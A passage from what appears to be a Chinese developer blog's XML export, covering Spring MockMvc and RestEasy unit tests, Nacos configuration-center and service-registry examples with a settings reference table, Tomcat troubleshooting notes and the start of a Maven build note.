package com.jiaoyiping.baseproject;import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;import com.jiaoyiping.baseproject.privilege.controller.MeunController;import com.jiaoyiping.baseproject.training.bean.Person;import junit.framework.Assert;import org.junit.Before;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.http.MediaType;import org.springframework.test.context.ContextConfiguration;import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;import org.springframework.test.context.web.WebAppConfiguration;import org.springframework.test.web.servlet.MockMvc;import org.springframework.test.web.servlet.ResultActions;import org.springframework.test.web.servlet.setup.MockMvcBuilders;import org.springframework.web.servlet.ModelAndView;@RunWith(SpringJUnit4ClassRunner.class)@WebAppConfiguration//@ContextConfiguration(classes = {WebMvcConfig.class, MockDataConfig.class})@ContextConfiguration(  locations = {    "classpath:/spring/applicationContext.xml",    "classpath*:mvc-dispatcher-servlet.xml",  })public class TestMockMvc {  @Autowired  private org.springframework.web.context.WebApplicationContext context;  MockMvc mockMvc;  @Before  public void before() {    //可以对所有的controller来进行测试    mockMvc = MockMvcBuilders.webAppContextSetup(context).build();    //仅仅对单个Controller来进行测试    // mockMvc = MockMvcBuilders.standaloneSetup(new MeunController()).build();  }  @Test  public void testGetMenu() {    try {      System.out.println("----------------------------");      ResultActions actions = this.mockMvc.perform(get("/menu/manage.action"));      System.out.println(status());      // System.out.println(content().toString());      actions.andExpect(status().isOk());      // actions.andExpect(content().contentType("text/html"));      System.out.println("----------------------------");    } catch (Exception e) {      e.printStackTrace();    }  }  //从controller里直接增加用户(用POST的方式)  //post("路径").param("属性名","属性值"); 用这种方法来构造POST  @Test  public void addPerson() {    try {      ResultActions resultActions =        this.mockMvc.perform(            post("/person/add")              .param("name", "用友软件")              .param("age", "23")              .param("address", "北京市永丰屯")          );      resultActions.andExpect(status().isOk());    } catch (Exception e) {      e.printStackTrace();    }  }  //得到Controller层返回的ModelAndView的方法：resultActions.andReturn().getModelAndView().getModel().get("person");  @Test  public void getPerson() {    String id = "297e5fb648b0e6d30148b0e6da6d0000";    try {      ResultActions resultActions =        this.mockMvc.perform(post("/person/toEditPerson").param("id", id))          .andExpect(status().isOk());      Person person = (Person) (        resultActions.andReturn().getModelAndView().getModel().get("person")      );      Assert.assertEquals(23, person.getAge());      System.out.println(person.getId());      System.out.println(person.getName());      System.out.println(person.getAge());      System.out.println(person.getAddress());      Assert.assertEquals(23, person.getAge());    } catch (Exception e) {      e.printStackTrace();    }  }}
测试RestEasy提供的接口(当使用restEasy提供的rest类型接口的时候会用到)
RestEasy提供了 org.jboss.resteasy.core.Dispatcher类来模拟http请求，并返回数据。这样,在测试接口的时候就不必启动容器了
代码如下
package cn.cmri.pds.controller;import cn.cmri.pds.project.controllor.ProjectTagControllor;import cn.cmri.pds.project.service.ProjectTagService;import java.net.URISyntaxException;import javax.servlet.http.HttpServletResponse;import org.jboss.resteasy.core.Dispatcher;import org.jboss.resteasy.mock.MockDispatcherFactory;import org.jboss.resteasy.mock.MockHttpRequest;import org.jboss.resteasy.mock.MockHttpResponse;import org.junit.Assert;import org.junit.Before;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.test.context.ContextConfiguration;import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(locations = { "classpath*:spring-config-test.xml" })public class TestProjectTagController {  @Autowired  ProjectTagService projectTagService;  Dispatcher dispatcher;  @Before  public void before() {    ProjectTagControllor projectTagControllor = new ProjectTagControllor();    projectTagControllor.setProjectTagService(projectTagService);    dispatcher = MockDispatcherFactory.createDispatcher();    dispatcher.getRegistry().addSingletonResource(projectTagControllor);  }  @Test  public void testProjectTags() throws URISyntaxException {    MockHttpRequest request = MockHttpRequest.get("/rest/project/123456/tags");    MockHttpResponse response = new MockHttpResponse();    dispatcher.invoke(request, response);    Assert.assertEquals(HttpServletResponse.SC_NOT_FOUND, response.getStatus());    Assert.assertEquals("指定的项目不存在", response.getContentAsString());  }}
]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Junit</category>
      </categories>
      <tags>
        <tag>Junit</tag>
      </tags>
  </entry>
  <entry>
    <title>Nacos 使用示例</title>
    <url>/20230301/d8cb1733.html</url>
    <content><![CDATA[配置中心示例
源码地址：https://github.com/hmxyl/nacosdemo.git
准备Nacos配置文件

使用 application.yml 配置（推荐）


版本号
从 2021.0.1.0 开始，Spring Cloud Alibaba  版本将会对应 Spring Cloud 版本，
前三位为 Spring Cloud 版本，最后一位为扩展版本
弃用 bootstrap.yml 文件（Spring Cloud 在Spring boot 2.4以后无法应用BootStrap.yml）
源码： configuration 模块




pom.xml
 &lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt;


application.yml
 server:  port: 8801spring:  application:    name: configuration  cloud:    nacos:      server-addr: native.virtual.com:8848      config:        server-addr: ${spring.cloud.nacos.server-addr}        namespace: learn-${spring.profiles.active}  config:    import:      - optional:nacos:${spring.application.name}.yml?refreshEnabled=true&amp;group=DEFAULT_GROUP      - optional:nacos:text.yml?refreshEnabled=true&amp;group=DEFAULT_GROUP      - optional:nacos:code.yml?refreshEnabled=true&amp;group=DEFAULT_GROUP


启动时 配置 active profiles 为 dev


启动 ConfigurationOldApplication


访问 http://localhost:8801/config/info 获取配置信息
 @RestControllerpublic class ConfigClientController {    @Autowired    ConfigInfo configInfo;    @GetMapping("/config/info")    public String getConfigInfo() {        return configInfo.getText() + ":" + configInfo.getCode();    }}


Junit 单元测试
 import com.local.bean.ConfigInfo;import org.junit.jupiter.api.Test;import org.junit.runner.RunWith;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.test.context.ActiveProfiles;import org.springframework.test.context.TestPropertySource;import org.springframework.test.context.junit4.SpringRunner;import javax.annotation.Resource;@RunWith(SpringRunner.class)@SpringBootTest(classes = ConfigurationOldApplication.class)@ActiveProfiles("dev")@TestPropertySource(        properties = {                "spring.cloud.nacos.config.namespace=learn-dev"        })class ConfigurationOldApplicationTests {    @Resource    private ConfigInfo configInfo;    @Test    void testConfig() {        assert "abc".equalsIgnoreCase(configInfo.getText());        assert "123".equalsIgnoreCase(configInfo.getCode());        assert "configuration_test".equalsIgnoreCase(configInfo.getMessage());    }}


参考[1]：https://github.com/alibaba/spring-cloud-alibaba/blob/2021.x/spring-cloud-alibaba-docs/src/main/asciidoc-zh/sca-upgrade-guide.adoc
参考[2]：https://developer.aliyun.com/article/897341#slide-12
使用 bootstrap.yml 配置（不推荐）

源码： configuration_old 模块



pom.xml
 &lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--SpringCloud2020及以后的版本默认不启用 bootstrap 配置，我们需要在pom里面显式地引入：--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-bootstrap&lt;/artifactId&gt;&lt;/dependency&gt;

注意：我们使用的 Spring Cloud 2020 版本默认不启用 bootstrap，若想要在应用启动时加载 bootstrap 配置（例如 bootstrap.yml 或 bootstrap.properties），就需要我们在 pom.xml 中显式的引入 spring-cloud-starter-bootstrap 依赖。



bootstrap.yml
 server:  port: 8802spring:  application:    name: configuration_old  cloud:    nacos:      config:        server-addr: native.virtual.com:8848        namespace: learn-${spring.profiles.active}        group: DEFAULT_GROUP        name: configuration.yml        file-extension: yml        extension-configs[0]:          data-id: text.yml          refresh: true        extension-configs[1]:          data-id: code.yml          refresh: true

config配置的dataID组成: ${prefix}-${spring.profiles.active}.${file-extension}

${prefix}：默认取值为微服务的服务名，即配置文件中 spring.application.name 的值，我们可以在配置文件中通过配置 spring.cloud.nacos.config.prefix 来指定。
${spring.profiles.active}：表示当前环境对应的 Profile，例如 dev、test、prod 等。当没有指定环境的 Profile 时，其对应的连接符也将不存在， dataId 的格式变成${prefix}.${file-extension}。
${file-extension}：表示配置内容的数据格式，我们可以在配置文件中通过配置项 spring.cloud.nacos.config.file-extension 来配置，例如 properties 和 yaml。


问题记录：


若文件名称不为 bootstrap.yml， 则在启动时，会先加载默认配置。server-addr 为127.0.0.1:8848，而正确的配置，在注解参数读取完成之后，才能读取到。因此BEAN 创建失败
com.alibaba.cloud.nacos.NacosConfigManager、com.alibaba.cloud.nacos.NacosConfigProperties


 org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'scopedTarget.configInfo': Injection of autowired dependencies failed; nested exception is java.lang.IllegalArgumentException: Could not resolve placeholder 'config.text' in value "${config.text}"	at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:405) ~[spring-beans-5.3.18.jar:5.3.18]  ....


启动时 配置 active profiles 为 dev


启动 ConfigurationOldApplication


访问 http://localhost:8802/config/info 获取配置信息。同上。


Junit测试。同上。


注册中心示例
目的：将不同的服务，注册到服务列表中，如下图所示




字段
说明





服务名
注册的服务名称spring.cloud.nacos.discovery.service 默认配置的是：spring.application.name



触发保护阈值
保护阈值：可以设置为0-1之间的浮点数，它其实是⼀个⽐例值（当前服务健康实例数/当前服务总实例数）⼀般流程下， nacos是服务注册中⼼，服务消费者要从nacos获取某⼀个服务的可⽤实例信息，对于服务实例有健康/不健康状态之分， nacos在返回给消费者实例信息的时候，会返回健康实例。这个时候在⼀些⾼并发、⼤流量场景下会存在⼀定的问题：如果服务A有100个实例， 98个实例都不健康了，只有2个实例是健康的，如果nacos只返回这两个健康实例的信息的话，那么后续消费者的请求将全部被分配到这两个实例，流量洪峰到来， 2个健康的实例也扛不住了，整个服务A 就扛不住，上游的微服务也会导致崩溃，产⽣雪崩效应。保护阈值的意义在于：当服务A健康实例数/总实例数 &lt; 保护阈值 的时候，说明健康实例真的不多了，这个时候保护阈值会被触发（状态true）nacos将会把该服务所有的实例信息（健康的+不健康的）全部提供给消费者，消费者可能访问到不健康的实例，请求失败，但这样也⽐造成雪崩要好，牺牲了⼀些请求，保证了整个系统的⼀个可⽤










服务注册中心（Register Service）：它是一个 Nacos Server，可以为服务提供者和服务消费者提供服务注册和发现功能。
服务提供者（Provider Service）：它是一个 Nacos Client，用于对外服务。它将自己提供的服务注册到服务注册中心，以供服务消费者发现和调用。
服务消费者（Consumer Service）：它是一个 Nacos Client，用于消费服务。它可以从服务注册中心获取服务列表，调用所需的服务。

注册服务提供者

producer_a、producer_a 两个模块，模拟两个服务提供者实例

producer_a


pom.xml
 &lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;        &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;


application.yml
 server:  port: 8001spring:  application:    name: producer  cloud:    nacos:      server-addr: native.virtual.com:8848      discovery:        server-addr: ${spring.cloud.nacos.server-addr}        namespace: learn-${spring.profiles.active}        service: ${spring.application.name}        register-enabled: true



配置
默认
说明




spring.cloud.nacos.discovery.service
${spring.application.name}
注册服务名称


spring.cloud.nacos.discovery.register-enabled
true
是否注册服务










启动类上，使用 @EnableDiscoveryClient 注解开启 Nacos 服务发现功能
 @EnableDiscoveryClient@SpringBootApplicationpublic class ProducerA {	public static void main(String[] args) {		SpringApplication.run(ProducerA.class, args);	}}


提供服务的业务方法（测试类）
 @RestControllerpublic class DeptController {    @Value("${server.port}")    private String serverPort;    @Value("${spring.application.name}")    private String serverName;    @GetMapping(value = "/nacos/{id}")    public String getPayment(@PathVariable("id") Integer id) {        return "服务名：" + serverName + "&lt;br /&gt; 端口号： " + serverPort + "&lt;br /&gt; 传入的参数：" + id;    }}


启动模块, 提示  register finished 注册完成。查看Nacos服务列表，此时 producer  服务已注册，实例数为1。


使用浏览器访问http://localhost:8001/nacos/1 验证实例是否正常提供服务



producer_b


pom.xml ：同 producer_a


application.yml
 server:  port: 8002spring:  application:    name: producer  cloud:    nacos:      server-addr: native.virtual.com:8848      discovery:        server-addr: ${spring.cloud.nacos.server-addr}        namespace: learn-${spring.profiles.active}        service: ${spring.application.name}


启动类上，使用 @EnableDiscoveryClient 注解开启 Nacos 服务发现功能


提供服务的业务方法（测试类）


启动模块。查看Nacos服务列表，此时 producer  服务已注册，实例数为2。


使用浏览器访问http://localhost:8002/nacos/1 验证实例是否正常提供服务



注册服务消费者
consumer


pom.xml
 &lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;        &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;!--由于 Netflix Ribbon 进入停更维护阶段，因此新版本的 Nacos discovery 都已经移除了 Ribbon ，此时我们需要引入 loadbalancer 代替 --&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;        &lt;artifactId&gt;spring-cloud-loadbalancer&lt;/artifactId&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;


application.yml
 server:  port: 8101spring:  application:    name: consumer  cloud:    nacos:      server-addr: native.virtual.com:8848      discovery:        server-addr: ${spring.cloud.nacos.server-addr}        namespace: learn-${spring.profiles.active}        register-enabled: falseservice-url:  nacos-user-service: http://producer


创建一个配置类，使用 @LoadBalanced 注解与 Ribbon 进行集成开启负载均衡功能
 import org.springframework.cloud.client.loadbalancer.LoadBalanced;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.client.RestTemplate;@Configurationpublic class ApplicationContextBean {    @Bean    @LoadBalanced //与 Ribbon 集成，并开启负载均衡功能    public RestTemplate getRestTemplate() {        return new RestTemplate();    }}


创建消费者测试类
 @RestControllerpublic class ConsumerController {    @Resource    private RestTemplate restTemplate;    @Value("${service-url.nacos-user-service}")    private String serverURL; //服务提供者的服务名    @GetMapping("/consumer/nacos/{id}")    public String paymentInfo(@PathVariable("id") Long id) {        return restTemplate.getForObject(serverURL + "/nacos/" + id, String.class);    }}


启动consumer模块


使用浏览器多次访问 http://localhost:8101/consumer/nacos/1。
浏览器地址不变，4次请求结果如下



请求次数
返回结果




1
服务名：producer端口号： 8001传入的参数：1


2
服务名：producer端口号： 8002传入的参数：1


3
服务名：producer端口号： 8001传入的参数：1


4
服务名：producer端口号： 8002传入的参数：1





问题记录

nacos服务部署时， 配置的默认路径由  server.servlet.contextPath=/nacos 修改为  server.servlet.contextPath=/  API 查询结果404

]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Nacos</category>
      </categories>
      <tags>
        <tag>Nacos</tag>
      </tags>
  </entry>
  <entry>
    <title>Nacos</title>
    <url>/20230301/c383a3c4.html</url>
    <content><![CDATA[Nacos 是一个更易于帮助构建云原生应用的动态服务发现、配置和服务管理平台（参考自 Nacos 官网）。
英文全称为 Dynamic Naming and Configuration Service，是一个由阿里巴巴团队使用 Java 语言开发的开源项目。Nacos 的命名是由 3 部分组成：



组成部分
全称
描述




Na
naming/nameServer
即服务注册中心，与 Spring Cloud Eureka 的功能类似。


co
configuration
即配置中心，与 Spring Cloud Config+Spring Cloud Bus 的功能类似。


s
service
即服务，表示 Nacos 实现的服务注册中心和配置中心都是以服务为核心的。



我们可以将 Nacos 理解成服务注册中心和配置中心的组合体。

它可以替换 Eureka 作为服务注册中心，实现服务的注册与发现；
可以替换 Spring Cloud Config 作为配置中心，实现配置的动态刷新。

Nacos 支持几乎所有主流类型“服务”的发现、配置和管理：

Kubernetes Service
gRPC &amp; Dubbo RPC Service
Spring Cloud RESTful Service

Nacos 的特性
Nacos 提供了一系列简单易用的特性，能够帮助我们快速地实现动态服务发现、服务配置等功能。
服务发现
Nacos 支持基于 DNS 和 RPC 的服务发现。
当服务提供者使用原生 SDK、OpenAPI 或一个独立的 Agent TODO 向 Nacos 注册服务后，服务消费者可以在 Nacos 上通过 DNS TODO 或 HTTP&amp;API 查找、发现服务。
服务健康监测
Nacos 提供对服务的实时健康检查，能够阻止请求发送到不健康主机或服务实例上。Nacos 还提供了一个健康检查仪表盘，能够帮助我们根据健康状态管理服务的可用性及流量。
动态配置服务
动态配置服务可以让我们以中心化、外部化和动态化的方式，管理所有环境的应用配置和服务配置。
动态配置消除了配置变更时重新部署应用和服务的需要，让配置管理变得更加高效、敏捷。
配置中心化管理让实现无状态服务变得更简单，让服务按需弹性扩展变得更容易。
Nacos 提供了一个简洁易用的 UI 帮助我们管理所有服务和应用的配置。Nacos 还提供包括配置版本跟踪、金丝雀发布、一键回滚配置以及客户端配置更新状态跟踪在内的一系列开箱即用的配置管理特性，帮助我们更安全地在生产环境中管理配置变更和降低配置变更带来的风险。
动态 DNS 服务
Nacos 提供了动态 DNS 服务，能够让我们更容易地实现负载均衡、流量控制以及数据中心内网的简单 DNS 解析服务。
Nacos 提供了一些简单的 DNS APIs TODO，可以帮助我们管理服务的关联域名和可用的 IP:PORT 列表。
服务及其元数据管理
Nacos 能让我们从微服务平台建设的视角管理数据中心的所有服务及元数据，包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略、服务的 SLA 以及 metrics 统计数据。
Nacos 两大组件
与 Eureka 类似，Nacos 也采用 CS（Client/Server，客户端/服务器）架构，它包含两大组件，如下表。


Nacos Server
描述：

Nacos 服务端，与 Eureka Server 不同，Nacos Server 由阿里巴巴团队使用 Java 语言编写并将 Nacos Server 的下载地址给用户，用户只需要直接下载并运行即可。

功能：

Nacos Server 可以作为服务注册中心，帮助 Nacos Client 实现服务的注册与发现。
Nacos Server 可以作为配置中心，帮助 Nacos Client 在不重启的情况下，实现配置的动态刷新。



Nacos Client
描述：

Nacos 客户端，通常指的是微服务架构中的各个服务，由用户自己搭建，可以使用多种语言编写。

功能：


Nacos Client 通过添加依赖 spring-cloud-starter-alibaba-nacos-discovery，在服务注册中心（Nacos Server）中实现服务的注册与发现


Nacos Client 通过添加依赖 spring-cloud-starter-alibaba-nacos-config，在配置中心（Nacos Server）中实现配置的动态刷新。




Nacos 服务注册中心
Nacos 作为服务注册中心可以实现服务的注册与发现，流程如下图。

在图 1 中共涉及到以下 3 个角色：

服务注册中心（Register Service）：它是一个 Nacos Server，可以为服务提供者和服务消费者提供服务注册和发现功能。
服务提供者（Provider Service）：它是一个 Nacos Client，用于对外服务。它将自己提供的服务注册到服务注册中心，以供服务消费者发现和调用。
服务消费者（Consumer Service）：它是一个 Nacos Client，用于消费服务。它可以从服务注册中心获取服务列表，调用所需的服务。

Nacos 实现服务注册与发现的流程如下：

从 Nacos 官方提供的下载页面中，下载 Nacos Server 并运行。
服务提供者 Nacos Client 启动时，会把服务以服务名（spring.application.name）的方式注册到服务注册中心（Nacos Server）；
服务消费者 Nacos Client 启动时，也会将自己的服务注册到服务注册中心；
服务消费者在注册服务的同时，它还会从服务注册中心获取一份服务注册列表信息，该列表中包含了所有注册到服务注册中心上的服务的信息（包括服务提供者和自身的信息）；
在获取了服务提供者的信息后，服务消费者通过 HTTP 或消息中间件远程调用服务提供者提供的服务。

默认端口说明



端口
与主端口的偏移量
描述
版本




8848
0
主端口



9848
1000
客户端gRPC请求服务端端口，用于客户端向服务端发起连接和请求



9849
1001
服务端gRPC请求服务端端口，用于服务间同步等










Common property configuration



name
description
option




MODE
cluster/standalone
cluster/standalone default cluster


NACOS_SERVERS
nacos cluster address
eg. ip1:port1 ip2:port2 ip3:port3


PREFER_HOST_MODE
Whether hostname are supported
hostname/ip default ip


NACOS_APPLICATION_PORT
nacos server port
default 8848


NACOS_SERVER_IP
custom nacos server ip when network was mutil-network



SPRING_DATASOURCE_PLATFORM
standalone support mysql
mysql / empty default empty


MYSQL_SERVICE_HOST
mysql host



MYSQL_SERVICE_PORT
mysql database port
default : 3306


MYSQL_SERVICE_DB_NAME
mysql database name



MYSQL_SERVICE_USER
username of database



MYSQL_SERVICE_PASSWORD
password of database



MYSQL_DATABASE_NUM
It indicates the number of database
default :1


MYSQL_SERVICE_DB_PARAM
Database url parameter
default : characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useSSL=false


JVM_XMS
-Xms
default :1g


JVM_XMX
-Xmx
default :1g


JVM_XMN
-Xmn
default :512m


JVM_MS
-XX:MetaspaceSize
default :128m


JVM_MMS
-XX:MaxMetaspaceSize
default :320m


NACOS_DEBUG
enable remote debug
y/n default :n


TOMCAT_ACCESSLOG_ENABLED
server.tomcat.accesslog.enabled
default :false


NACOS_AUTH_SYSTEM_TYPE
The auth system to use, currently only ‘nacos’ is supported
default :nacos


NACOS_AUTH_ENABLE
If turn on auth system
default :false


NACOS_AUTH_TOKEN_EXPIRE_SECONDS
The token expiration in seconds
default :18000


NACOS_AUTH_TOKEN
The default token
default :SecretKey012345678901234567890123456789012345678901234567890123456789


NACOS_AUTH_CACHE_ENABLE
Turn on/off caching of auth information. By turning on this switch, the update of auth information would have a 15 seconds delay.
default : false


MEMBER_LIST
Set the cluster list with a configuration file or command-line argument
eg:192.168.16.101:8847?raft_port=8807,192.168.16.101?raft_port=8808,192.168.16.101:8849?raft_port=8809


EMBEDDED_STORAGE
Use embedded storage in cluster mode without mysql
embedded default : none


NACOS_AUTH_CACHE_ENABLE
nacos.core.auth.caching.enabled
default : false


NACOS_AUTH_USER_AGENT_AUTH_WHITE_ENABLE
nacos.core.auth.enable.userAgentAuthWhite
default : false


NACOS_AUTH_IDENTITY_KEY
nacos.core.auth.server.identity.key
default : serverIdentity


NACOS_AUTH_IDENTITY_VALUE
nacos.core.auth.server.identity.value
default : security


NACOS_SECURITY_IGNORE_URLS
nacos.security.ignore.urls
default : /,/error,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.ico,/console-fe/public/**,/v1/auth/**,/v1/console/health/**,/actuator/**,/v1/console/server/**



参考

http://c.biancheng.net/springcloud/nacos.html
https://www.jb51.net/article/235057.htm

]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Nacos</category>
      </categories>
      <tags>
        <tag>Nacos</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat异常排查记录</title>
    <url>/20221030/932ec968.html</url>
    <content><![CDATA[500 Internal Server Error
原因1：是服务本身的问题（后台日志能查到原因）
原因2：是Nginx服务器的原因。
可参考原因： （未验证）
1.上传的文件权限设置错误
2.htaccess文件写入错误的代码
java.lang.NoSuchMethodException: org.apache.catalina.deploy.WebXml addFilter
java.lang.NoSuchMethodException: org.apache.catalina.deploy.WebXml addFilter  at org.apache.tomcat.util.IntrospectionUtils.callMethod1(IntrospectionUtils.java:855)  at org.apache.tomcat.util.digester.SetNextRule.end(SetNextRule.java:201)  at org.apache.tomcat.util.digester.Digester.endElement(Digester.java:1051)  at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.endElement(AbstractSAXParser.java:601)  at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanEndElement(XMLDocumentFragmentScannerImpl.java:1774)  at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2930)  at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)  at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:510)  at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:807)  at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)  at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:107)  at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)  at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)  at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1537)  at org.apache.catalina.startup.ContextConfig.parseWebXml(ContextConfig.java:1825)  at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1201)  at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:855)  at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:345)  at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)  at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90) ...
解决方法为：在Tomacat7的context.xml文件里的&lt;Context&gt;中加上&lt;Loader delegate="true" /&gt;
]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>日常记录</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>在请求目标中找到无效字符</title>
    <url>/20221030/d035d83e.html</url>
    <content><![CDATA[问题描述
错误信息：在请求目标中找到无效字符。有效字符在rfc 7230和rfc 3986中定义
定位原因
原因：请求地址中存在不支持的特殊符号
解决方法
解决： relaxedPathChars="|{}[],%" relaxedQueryChars="|{}[],%"
&lt;Connector port="80" protocol="HTTP/1.1"           connectionTimeout="20000"relaxedPathChars="|{}[],%" relaxedQueryChars="|{}[],%"           redirectPort="8443"  /&gt;
]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>日常记录</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>给Tomcat配置外部资源路径</title>
    <url>/20221030/673ec6c6.html</url>
    <content><![CDATA[背景说明
对于一个web项目来说，除了文字之外，图片，视频等媒体元素也是其重要的组成部分。
我们知道，web项目中如果用到大量的图片、视屏的资源，我们通常的做法是只在数据库中存储图片、视频等资源的路径，web项目直接通过路径来引用到对应的资源，而不是把整张图片以流的形式存储在数据库中，
​
当然对于系统中没用用到大量图片，或是对图片质量要求不是很高的一些小图标，我们也可以直接采用留的形式或者用base64编码以longtext的形式存储到数据库中。可以不必费时费力去配置这些资源的路径。
但是他的弊端在于增加了数据库的压力，只适用于那种格局比较小，对数据库服务器性能没有太大要求的小项目中。
给Tomcat配置外部资源路径的好处在于他大大减小了服务器以及数据库的压力，数据库中只需要存储资源的路径，把图片上传到Tomcat外的指定文件夹中，提供给
Tomcat中wabapps下的web项目引用。
处理方法
找到tomcat安装目录下conf/server.xml文件，在…标签内添加配置：
&lt;!-- video image resources fload--&gt;&lt;Context docBase="C:\resources" reloadable="true" debug="0" path="/resources"/&gt;

docBase是文件夹的物理路径
path是该文件夹的访问路径

然后重启tomcat即可。假设在resources文件夹下存在一张名为test.jpg的图片，此时只需要http://localhost:8080/resources/test.jsp即可访问到该图片资源。
]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>日常记录</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>验证码图片无法显示</title>
    <url>/20221030/294d5c08.html</url>
    <content><![CDATA[问题描述
服务器段错误信息：java.lang.NoClassDefFoundError: Could not initialize class sun.awt.X11.XToolkit
定位原因
对于一个Java服务器来说经常要处理一些图形元素，例如地图的创建或者图形和图表等。
这些API基本上总是需要运行一个X-server以便能使用AWT（Abstract Window Toolkit，抽象窗口工具集）。
问题处理
在Tomcat/bin/catalina.sh 中增加 -Djava.awt.headless=true
如下：JAVA_OPTS="$JAVA_OPTS -Djava.awt.headless=true"

]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>日常记录</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Maven使用场景记录</title>
    <url>/20221030/4a3536f5.html</url>
    <content><![CDATA[Compile的设置
&lt;project ...&gt;    &lt;build&gt;        &lt;plugins&gt;            &lt;plugin&gt;                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;                &lt;version&gt;3.1&lt;/version&gt;                &lt;configuration&gt;                    &lt;source&gt;${maven.compiler.source}&lt;/source&gt;                    &lt;target&gt;${maven.compiler.target}&lt;/target&gt;                    &lt;encoding&gt;${project.build.sourceEncoding}&lt;/encoding&gt;                &lt;/configuration&gt;            &lt;/plugin&gt;        &lt;/plugins&gt;    &lt;/build&gt;&lt;/project&gt;	
SpringBoot项目打包

使用spring-boot-maven-plugin插件，指定运行主类

